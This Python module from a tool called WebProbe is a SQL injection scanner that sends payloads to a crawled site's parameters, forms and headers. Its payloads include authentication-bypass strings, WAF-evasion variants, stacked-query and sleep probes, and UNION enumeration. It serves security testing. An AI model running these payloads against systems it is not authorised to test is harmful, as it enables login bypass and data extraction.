# scanner/sqli.py
# WebProbe — Industry Level SQL Injection Scanner
# Detects: Error, Boolean, Time, UNION, Login Bypass,
#          Stacked Queries, JSON SQLi, Header SQLi,
#          Cookie SQLi, WAF Bypass, Response Based
# Speed: Parallel threading, fast confirmation
# Accuracy: Double confirmation, no false positives

import time
import os
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
from utils.http_engine import send_get, send_post
from utils.helpers import get_timestamp
from rich.console import Console

console = Console()
print_lock = threading.Lock()

# ═══════════════════════════════════════════════════
# SQL ERROR SIGNATURES — 40 patterns
# Covers MySQL, SQLite, PostgreSQL, MSSQL, Oracle,
# MongoDB, ORM errors (Sequelize, Knex, Django)
# ═══════════════════════════════════════════════════
SQL_ERRORS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql", "mysql_fetch", "mysql_num_rows",
    "mysql_query", "supplied argument is not a valid mysql",
    "mysql server version for the right syntax",
    # SQLite
    "sqlite_exception", "sqlite error", "sqlite3::exception",
    "sqlite3.operationalerror", "disk i/o error",
    "error: sqlite", "sqliteexception",
    # PostgreSQL
    "pg_query", "pg_exec", "postgresql error",
    "unterminated quoted string",
    "invalid input syntax for type",
    "syntax error at or near",
    # MSSQL
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error converting",
    "incorrect syntax near",
    # Oracle
    "ora-00907", "ora-00933", "ora-00921",
    "oracle error", "ora-01756",
    # ORM Errors
    "sequelizedatabaseerror", "knex:",
    "operationalerror", "programmingerror",
    "django.db.utils",
    # Generic
    "sql syntax", "sql error", "database error",
    "query failed", "invalid query",
    "unexpected end of sql",
    "column count doesn't match",
    "the used select statements have different",
    "warning: pg_",
]

# ═══════════════════════════════════════════════════
# LOGIN SUCCESS INDICATORS
# When login bypass works these appear in response
# ═══════════════════════════════════════════════════
LOGIN_SUCCESS = [
    '"token"', '"authentication"', '"email"',
    '"id":', '"role"', '"bid"', '"umail"',
    'authentication', '"status":"success"',
    '"user":', '"username":', '"access_token"',
]

# ═══════════════════════════════════════════════════
# WAF BYPASS PAYLOADS
# Encoded and obfuscated to bypass WAF rules
# ═══════════════════════════════════════════════════
WAF_BYPASS_PAYLOADS = [
    # Comment obfuscation
    "'/**/OR/**/1=1--",
    "'/**/OR/**/'1'='1",
    "' OR/**/1=1--",
    # URL encoding
    "%27%20OR%201%3D1--",
    "%27%20OR%20%271%27%3D%271",
    # Case variation
    "' oR '1'='1",
    "' Or 1=1--",
    "' OR 0x313d31--",
    # Double encoding
    "%2527%2520OR%25201%253D1--",
    # Whitespace bypass
    "'\tOR\t1=1--",
    "'\nOR\n1=1--",
    "' OR\r\n1=1--",
    # Scientific notation
    "' OR 1e0=1e0--",
    # Hex bypass
    "' OR 0x31=0x31--",
]

# ═══════════════════════════════════════════════════
# STACKED QUERY PAYLOADS
# Tests if multiple SQL statements can be executed
# ═══════════════════════════════════════════════════
STACKED_PAYLOADS = [
    "'; SELECT SLEEP(3)--",
    "'; SELECT 1--",
    "'; SELECT version()--",
    "1; SELECT SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "'; SELECT pg_sleep(3)--",
]

# ═══════════════════════════════════════════════════
# LOAD PAYLOADS FROM FILE
# ═══════════════════════════════════════════════════
def load_payloads():
    payload_file = os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        "payloads", "sqli.txt"
    )
    try:
        with open(payload_file, "r") as f:
            payloads = [l.strip() for l in f
                       if l.strip() and not l.startswith("#")]
        with print_lock:
            console.print(
                f"[dim]    [*] Loaded {len(payloads)} SQLi payloads[/dim]"
            )
        return payloads
    except FileNotFoundError:
        return ["' OR '1'='1", "' OR 1=1--", "admin'--"]

# ═══════════════════════════════════════════════════
# CHECK SQL ERROR IN RESPONSE
# ═══════════════════════════════════════════════════
def has_sql_error(text):
    if not text:
        return False, ""
    lower = text.lower()
    for err in SQL_ERRORS:
        if err in lower:
            return True, err
    return False, ""

# ═══════════════════════════════════════════════════
# SEND REQUEST HELPER
# Handles GET and POST uniformly
# ═══════════════════════════════════════════════════
def send_request(url, method, param_name, payload, base_data=None):
    try:
        if method == "get":
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.scheme else url.split("?")[0]
            query_dict = {}
            if parsed.query:
                for k, v in parse_qs(parsed.query).items():
                    query_dict[k] = v[0] if v else ""
            query_dict[param_name] = payload
            return send_get(base, params=query_dict)
        else:
            data = dict(base_data) if base_data else {}
            data[param_name] = payload
            return send_post(url, data=data)
    except Exception:
        return None

# ═══════════════════════════════════════════════════
# SEND JSON REQUEST
# For APIs that accept JSON body
# ═══════════════════════════════════════════════════
def send_json_request(url, param_name, payload, base_data=None):
    try:
        import requests
        data = dict(base_data) if base_data else {}
        data[param_name] = payload
        headers = {"Content-Type": "application/json"}
        response = requests.post(
            url,
            json=data,
            headers=headers,
            timeout=10,
            verify=False
        )
        return response
    except Exception:
        return None

# ═══════════════════════════════════════════════════
# GET BASELINE RESPONSE
# Normal response for comparison
# ═══════════════════════════════════════════════════
def get_baseline(url, method, param_name, base_data=None):
    try:
        r = send_request(url, method, param_name, "normaltest123", base_data)
        if r:
            return r.status_code, len(r.text), r.text
    except Exception:
        pass
    return 200, 0, ""

# ═══════════════════════════════════════════════════
# BUILD FINDING DICT
# Standard format for all findings
# ═══════════════════════════════════════════════════
def _build_finding(url, param_name, method, result, injection_point="body"):
    return {
        "vulnerability": "SQL Injection",
        "type": f"SQL Injection — {result['sqli_type']}",
        "url": url,
        "parameter": param_name,
        "payload": result["payload"],
        "method": method.upper(),
        "evidence": result["evidence"],
        "sqli_type": result["sqli_type"],
        "injection_point": injection_point,
        "response_status": result.get("status", 200),
        "risk_level": "CRITICAL",
        "cvss_score": 9.8,
        "cwe": "CWE-89",
        "owasp": "A03:2021 — Injection",
        "timestamp": get_timestamp(),
    }

# ═══════════════════════════════════════════════════
# DETECTION 1 — ERROR BASED
# Fastest method — looks for DB errors in response
# ═══════════════════════════════════════════════════
def detect_error_based(url, method, param_name, base_data, payloads):
    # Use non-sleep, non-union payloads for speed
    test_payloads = [p for p in payloads
                    if "sleep" not in p.lower()
                    and "waitfor" not in p.lower()
                    and "union" not in p.lower()
                    and "pg_sleep" not in p.lower()][:25]

    for payload in test_payloads:
        r = send_request(url, method, param_name, payload, base_data)
        if r is None:
            continue
        found, error_msg = has_sql_error(r.text)
        if found:
            return {
                "sqli_type": "Error Based",
                "payload": payload,
                "evidence": f"DB error in response: '{error_msg}'",
                "status": r.status_code,
            }

    # Also try JSON body for APIs
    r = send_json_request(url, param_name, "' OR '1'='1", base_data)
    if r:
        found, error_msg = has_sql_error(r.text)
        if found:
            return {
                "sqli_type": "Error Based (JSON)",
                "payload": "' OR '1'='1",
                "evidence": f"DB error via JSON body: '{error_msg}'",
                "status": r.status_code,
            }

    return None

# ═══════════════════════════════════════════════════
# DETECTION 2 — LOGIN BYPASS
# Special logic for auth endpoints
# Tries multiple bypass techniques
# ═══════════════════════════════════════════════════
def detect_login_bypass(url, method, param_name, base_data, payloads):
    if not any(x in url.lower()
               for x in ["login", "signin", "auth", "user/login"]):
        return None

    bypass_payloads = [
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'--",
        "' OR 1=1#",
        "\" OR \"1\"=\"1\"--",
        "' OR ''='",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1--",
        "' OR 2>1--",
        "'||'1'='1",
        "' OR 'x'='x",
        "admin'/*",
    ]

    # Baseline — use invalid credentials
    base_r = send_request(
        url, "post", param_name,
        "invalid_test@webprobe.com", base_data
    )
    baseline_text = base_r.text if base_r else ""
    baseline_len = len(baseline_text)

    for payload in bypass_payloads:
        data = dict(base_data) if base_data else {}
        data[param_name] = payload
        # Ensure password is set
        for key in data:
            if "pass" in key.lower() and data[key] in ["", "test", "normaltest123"]:
                data[key] = "anypassword123"

        r = send_post(url, data=data)
        if r is None:
            continue

        # Check success indicators in response
        for indicator in LOGIN_SUCCESS:
            if indicator in r.text and indicator not in baseline_text:
                return {
                    "sqli_type": "Login Bypass",
                    "payload": payload,
                    "evidence": (
                        f"Auth bypassed — "
                        f"response contains: {indicator}"
                    ),
                    "status": r.status_code,
                }

        # Check status change
        if base_r and base_r.status_code in [401, 403]:
            if r.status_code == 200 and len(r.text) > baseline_len + 100:
                return {
                    "sqli_type": "Login Bypass",
                    "payload": payload,
                    "evidence": (
                        f"Status {base_r.status_code} → {r.status_code}, "
                        f"response grew by {len(r.text) - baseline_len} bytes"
                    ),
                    "status": r.status_code,
                }

        # Try JSON login bypass
        json_data = dict(base_data) if base_data else {}
        json_data[param_name] = payload
        r_json = send_json_request(url, param_name, payload, base_data)
        if r_json:
            for indicator in LOGIN_SUCCESS:
                if (indicator in r_json.text and
                        indicator not in baseline_text):
                    return {
                        "sqli_type": "Login Bypass (JSON)",
                        "payload": payload,
                        "evidence": (
                            f"JSON auth bypass — "
                            f"response contains: {indicator}"
                        ),
                        "status": r_json.status_code,
                    }

    return None

# ═══════════════════════════════════════════════════
# DETECTION 3 — BOOLEAN BASED
# Compares true vs false condition responses
# Confirms with second pair to avoid false positives
# ═══════════════════════════════════════════════════
def detect_boolean_based(url, method, param_name, base_data, baseline_len):
    bool_pairs = [
        ("' AND '1'='1'--", "' AND '1'='2'--"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("\" AND \"1\"=\"1\"--", "\" AND \"1\"=\"2\"--"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
    ]

    for true_p, false_p in bool_pairs:
        r_true = send_request(url, method, param_name, true_p, base_data)
        r_false = send_request(url, method, param_name, false_p, base_data)

        if r_true is None or r_false is None:
            continue

        len_true = len(r_true.text)
        len_false = len(r_false.text)
        diff = abs(len_true - len_false)

        if diff > 100 and len_true != len_false:
            # Confirm with second pair
            r_true2 = send_request(
                url, method, param_name, "' AND 2=2--", base_data
            )
            r_false2 = send_request(
                url, method, param_name, "' AND 2=3--", base_data
            )
            if r_true2 and r_false2:
                diff2 = abs(len(r_true2.text) - len(r_false2.text))
                if diff2 > 50:
                    return {
                        "sqli_type": "Boolean Based Blind",
                        "payload": true_p,
                        "evidence": (
                            f"True={len_true}B, False={len_false}B "
                            f"(diff:{diff}B). Confirmed with second pair."
                        ),
                        "status": r_true.status_code,
                    }

    return None

# ═══════════════════════════════════════════════════
# DETECTION 4 — TIME BASED BLIND
# Measures response time with sleep payloads
# Double confirms to eliminate false positives
# ═══════════════════════════════════════════════════
def detect_time_based(url, method, param_name, base_data):
    time_payloads = [
        ("' AND SLEEP(4)--", 4),
        ("\" AND SLEEP(4)--", 4),
        ("1 AND SLEEP(4)--", 4),
        ("' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", 4),
        ("'; WAITFOR DELAY '0:0:4'--", 4),
        ("'; SELECT pg_sleep(4)--", 4),
        ("' AND SLEEP(4) AND '1'='1", 4),
        ("\" AND SLEEP(4) AND \"1\"=\"1", 4),
    ]

    # Get baseline time
    start = time.time()
    send_request(url, method, param_name, "normaltest", base_data)
    baseline_time = time.time() - start

    for payload, sleep_sec in time_payloads:
        try:
            start = time.time()
            r = send_request(url, method, param_name, payload, base_data)
            elapsed = time.time() - start

            if elapsed >= sleep_sec and elapsed > baseline_time + 3:
                # Confirm with second request
                start2 = time.time()
                send_request(url, method, param_name, payload, base_data)
                elapsed2 = time.time() - start2

                if elapsed2 >= sleep_sec:
                    return {
                        "sqli_type": "Time Based Blind",
                        "payload": payload,
                        "evidence": (
                            f"Delayed {elapsed:.1f}s + "
                            f"confirmed {elapsed2:.1f}s "
                            f"(baseline: {baseline_time:.1f}s)"
                        ),
                        "status": r.status_code if r else 200,
                    }
        except Exception:
            continue

    return None

# ═══════════════════════════════════════════════════
# DETECTION 5 — UNION BASED
# Finds column count then injects UNION SELECT
# Can extract data from database
# ═══════════════════════════════════════════════════
def detect_union_based(url, method, param_name, base_data):
    columns = find_column_count(url, method, param_name, base_data)

    if columns == 0:
        # Try common column counts directly
        for col_count in [1, 2, 3, 4, 5]:
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            r = send_request(url, method, param_name, payload, base_data)
            if r is None:
                continue
            found, _ = has_sql_error(r.text)
            if not found and r.status_code == 200:
                columns = col_count
                break

    if columns == 0:
        return None

    # Try with marker to confirm extraction
    marker_nulls = ["NULL"] * columns
    marker_nulls[0] = "'WEBPROBE7331'"
    marker_payload = (
        f"' UNION SELECT {','.join(marker_nulls)}--"
    )

    r = send_request(url, method, param_name, marker_payload, base_data)
    if r and "WEBPROBE7331" in r.text:
        return {
            "sqli_type": "UNION Based (Data Extraction)",
            "payload": marker_payload,
            "evidence": (
                f"UNION SELECT {columns} cols — "
                f"marker 'WEBPROBE7331' extracted from DB"
            ),
            "status": r.status_code,
        }

    # Even without marker confirm if no error
    nulls = ",".join(["NULL"] * columns)
    union_payload = f"' UNION SELECT {nulls}--"
    r2 = send_request(url, method, param_name, union_payload, base_data)
    if r2:
        found, _ = has_sql_error(r2.text)
        if not found:
            return {
                "sqli_type": "UNION Based",
                "payload": union_payload,
                "evidence": (
                    f"UNION SELECT {columns} columns — "
                    f"no error returned, injection likely successful"
                ),
                "status": r2.status_code,
            }

    return None

# ═══════════════════════════════════════════════════
# FIND COLUMN COUNT
# Uses ORDER BY to find number of columns
# ═══════════════════════════════════════════════════
def find_column_count(url, method, param_name, base_data):
    for i in range(1, 11):
        payload = f"' ORDER BY {i}--"
        r = send_request(url, method, param_name, payload, base_data)
        if r is None:
            continue
        found, _ = has_sql_error(r.text)
        if found:
            return i - 1
    return 0

# ═══════════════════════════════════════════════════
# DETECTION 6 — STACKED QUERIES
# Tests if multiple statements can execute
# Dangerous — can modify data
# ═══════════════════════════════════════════════════
def detect_stacked_queries(url, method, param_name, base_data):
    for payload in STACKED_PAYLOADS:
        sleep_in_payload = "sleep" in payload.lower() or "delay" in payload.lower()

        if sleep_in_payload:
            start = time.time()
            r = send_request(url, method, param_name, payload, base_data)
            elapsed = time.time() - start
            if elapsed >= 3:
                return {
                    "sqli_type": "Stacked Queries",
                    "payload": payload,
                    "evidence": (
                        f"Stacked SLEEP executed — "
                        f"response delayed {elapsed:.1f}s"
                    ),
                    "status": r.status_code if r else 200,
                }
        else:
            r = send_request(url, method, param_name, payload, base_data)
            if r:
                found, err = has_sql_error(r.text)
                if not found and r.status_code == 200:
                    return {
                        "sqli_type": "Stacked Queries",
                        "payload": payload,
                        "evidence": (
                            f"Stacked query returned 200 — "
                            f"multiple statements may execute"
                        ),
                        "status": r.status_code,
                    }

    return None

# ═══════════════════════════════════════════════════
# DETECTION 7 — WAF BYPASS
# Uses encoded and obfuscated payloads
# Tries when normal payloads fail
# ═══════════════════════════════════════════════════
def detect_waf_bypass(url, method, param_name, base_data, baseline_len):
    for payload in WAF_BYPASS_PAYLOADS:
        r = send_request(url, method, param_name, payload, base_data)
        if r is None:
            continue

        found, err = has_sql_error(r.text)
        if found:
            return {
                "sqli_type": "WAF Bypass SQLi",
                "payload": payload,
                "evidence": (
                    f"WAF bypassed — DB error: '{err}'"
                ),
                "status": r.status_code,
            }

        # Check response change
        diff = abs(len(r.text) - baseline_len)
        if diff > 300 and baseline_len > 0:
            # Verify not dynamic
            r_safe = send_request(
                url, method, param_name, "safeinput123", base_data
            )
            safe_diff = abs(len(r_safe.text) - baseline_len) if r_safe else 0
            if safe_diff < 100:
                return {
                    "sqli_type": "WAF Bypass SQLi",
                    "payload": payload,
                    "evidence": (
                        f"WAF bypassed — response changed "
                        f"by {diff} bytes with obfuscated payload"
                    ),
                    "status": r.status_code,
                }

    return None

# ═══════════════════════════════════════════════════
# DETECTION 8 — HEADER INJECTION
# Tests SQLi in HTTP headers
# User-Agent, Referer, X-Forwarded-For, Cookie
# Many apps log these directly to DB
# ═══════════════════════════════════════════════════
def detect_header_injection(url):
    import requests
    import urllib3
    urllib3.disable_warnings()

    header_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' AND SLEEP(3)--",
    ]

    injectable_headers = [
        "User-Agent",
        "Referer",
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Forwarded-Host",
        "X-Client-IP",
        "CF-Connecting-IP",
    ]

    findings = []

    for header_name in injectable_headers:
        for payload in header_payloads:
            try:
                sleep_payload = "sleep" in payload.lower()

                headers = {header_name: payload}
                start = time.time()
                r = requests.get(
                    url, headers=headers,
                    timeout=10, verify=False
                )
                elapsed = time.time() - start

                # Check for SQL error
                found, err = has_sql_error(r.text)
                if found:
                    findings.append({
                        "sqli_type": f"Header Injection ({header_name})",
                        "payload": payload,
                        "evidence": (
                            f"SQLi via {header_name} header — "
                            f"DB error: '{err}'"
                        ),
                        "status": r.status_code,
                        "header": header_name,
                    })
                    break

                # Check time delay
                if sleep_payload and elapsed >= 3:
                    findings.append({
                        "sqli_type": f"Header Injection Time Based ({header_name})",
                        "payload": payload,
                        "evidence": (
                            f"SQLi via {header_name} — "
                            f"delayed {elapsed:.1f}s"
                        ),
                        "status": r.status_code,
                        "header": header_name,
                    })
                    break

            except Exception:
                continue

    return findings

# ═══════════════════════════════════════════════════
# DETECTION 9 — RESPONSE BASED (IMPROVED)
# Detects response manipulation carefully
# Avoids false positives from dynamic content
# ═══════════════════════════════════════════════════
def detect_response_based(url, method, param_name, base_data,
                           baseline_len, baseline_text):
    or_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1\"",
        "' OR ''='",
        "' OR 2>1--",
    ]

    for payload in or_payloads:
        r = send_request(url, method, param_name, payload, base_data)
        if r is None:
            continue

        current_len = len(r.text)
        diff = abs(current_len - baseline_len)

        if diff > 200 and baseline_len > 0:
            # Confirm not dynamic — test with safe input
            r_safe = send_request(
                url, method, param_name, "safeinput999", base_data
            )
            safe_len = len(r_safe.text) if r_safe else baseline_len
            safe_diff = abs(safe_len - baseline_len)

            if safe_diff < 100:
                # Check SQL error too
                found, err = has_sql_error(r.text)
                sqli_type = "Error Based" if found else "Response Manipulation"
                evidence_detail = (
                    f"DB error: '{err}'" if found
                    else f"Response changed {diff}B "
                         f"(baseline:{baseline_len}B, "
                         f"injected:{current_len}B)"
                )

                return {
                    "sqli_type": sqli_type,
                    "payload": payload,
                    "evidence": evidence_detail,
                    "status": r.status_code,
                }

    return None

# ═══════════════════════════════════════════════════
# TEST ONE PARAMETER — ALL DETECTION METHODS
# Runs in order: fast → slow
# Stops at first confirmed finding
# ═══════════════════════════════════════════════════
def test_parameter(url, param_name, param_value,
                   method, form_data=None, payloads=None):
    if payloads is None:
        payloads = load_payloads()

    with print_lock:
        console.print(
            f"[dim]      [→] {param_name} @ "
            f"{url[:60]}[/dim]"
        )

    base_data = dict(form_data) if form_data else {}
    baseline_status, baseline_len, baseline_text = get_baseline(
        url, method, param_name, base_data
    )

    # Detection order: fastest → slowest
    detections = [
        ("Error Based",     lambda: detect_error_based(url, method, param_name, base_data, payloads)),
        ("Login Bypass",    lambda: detect_login_bypass(url, method, param_name, base_data, payloads)),
        ("Response Based",  lambda: detect_response_based(url, method, param_name, base_data, baseline_len, baseline_text)),
        ("Boolean Based",   lambda: detect_boolean_based(url, method, param_name, base_data, baseline_len)),
        ("UNION Based",     lambda: detect_union_based(url, method, param_name, base_data)),
        ("WAF Bypass",      lambda: detect_waf_bypass(url, method, param_name, base_data, baseline_len)),
        ("Stacked Queries", lambda: detect_stacked_queries(url, method, param_name, base_data)),
        ("Time Based",      lambda: detect_time_based(url, method, param_name, base_data)),
    ]

    for name, detect_fn in detections:
        try:
            result = detect_fn()
            if result:
                with print_lock:
                    console.print(
                        f"[bold red]      [!!!] SQLi "
                        f"({result['sqli_type']}): "
                        f"{param_name} @ {url[:50]}[/bold red]"
                    )
                return _build_finding(url, param_name, method, result)
        except Exception:
            continue

    with print_lock:
        console.print(f"[dim]      [-] Clean: {param_name}[/dim]")
    return None

# ═══════════════════════════════════════════════════
# BUILD TEST TASKS
# Creates deduplicated list of params to test
# ═══════════════════════════════════════════════════
def build_test_tasks(crawler_results):
    tasks = []
    seen = set()

    forms = crawler_results.get("forms", [])
    params = crawler_results.get("params", [])

    for form in forms:
        url = form.get("action", "")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        base_data = {i["name"]: i.get("value", "test") for i in inputs}

        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            if inp.get("type") in ["submit", "button", "image", "file"]:
                continue
            key = f"{url}_{name}_{method}"
            if key not in seen:
                seen.add(key)
                tasks.append({
                    "url": url,
                    "param_name": name,
                    "param_value": inp.get("value", ""),
                    "method": method,
                    "form_data": base_data,
                    "source": "form",
                })

    for param in params:
        url = param.get("url", "")
        name = param.get("name", "")
        if not url or not name:
            continue
        # Deduplicate same endpoint
        base_url = url.split("?")[0]
        key = f"{base_url}_{name}_get"
        if key not in seen:
            seen.add(key)
            tasks.append({
                "url": url,
                "param_name": name,
                "param_value": param.get("value", ""),
                "method": "get",
                "form_data": None,
                "source": "url_param",
            })

    return tasks

# ═══════════════════════════════════════════════════
# MAIN SCAN FUNCTION
# Entry point called by main.py
# Parallel threading for speed
# ═══════════════════════════════════════════════════
def scan(crawler_results, llm_payloads=None):
    findings = []
    findings_lock = threading.Lock()

    console.print(
        "\n[bold red][*] Starting SQL Injection Scan...[/bold red]"
    )

    if llm_payloads and len(llm_payloads) > 0:
        seen = set()
        payloads = [p for p in llm_payloads if not (p in seen or seen.add(p))]
    else:
        payloads = load_payloads()

    console.print(
        f"[cyan]    [*] Active Payloads to Test: {len(payloads)}[/cyan]"
    )

    tasks = build_test_tasks(crawler_results)
    console.print(
        f"[cyan]    [*] Parameters to test: {len(tasks)}[/cyan]"
    )

    # Run header injection on base URL separately
    base_url = crawler_results.get("base_url", "")
    if base_url:
        console.print(
            f"[cyan]    [*] Testing header injection on {base_url}[/cyan]"
        )
        header_results = detect_header_injection(base_url)
        for hr in header_results:
            findings.append(
                _build_finding(base_url, hr["header"], "GET", hr, "header")
            )

    # Parallel parameter testing
    with ThreadPoolExecutor(max_workers=5) as executor:
        future_to_task = {
            executor.submit(
                test_parameter,
                task["url"],
                task["param_name"],
                task["param_value"],
                task["method"],
                task["form_data"],
                payloads,
            ): task
            for task in tasks
        }

        for future in as_completed(future_to_task):
            task = future_to_task[future]
            try:
                finding = future.result()
                if finding:
                    finding["source"] = task["source"]
                    with findings_lock:
                        # Deduplicate by URL + param base
                        base_url_f = finding["url"].split("?")[0]
                        exists = any(
                            f["url"].split("?")[0] == base_url_f and
                            f["parameter"] == finding["parameter"]
                            for f in findings
                        )
                        if not exists:
                            findings.append(finding)
            except Exception:
                pass

    # Print final summary
    console.print(f"\n[bold red][+] SQLi Scan Complete![/bold red]")
    console.print(
        f"[red]    Total Findings: {len(findings)}[/red]"
    )
    for i, f in enumerate(findings):
        console.print(
            f"[red]    [{i+1}] {f['type']} | "
            f"{f['parameter']} | {f['url'][:60]}[/red]"
        )

    return findings
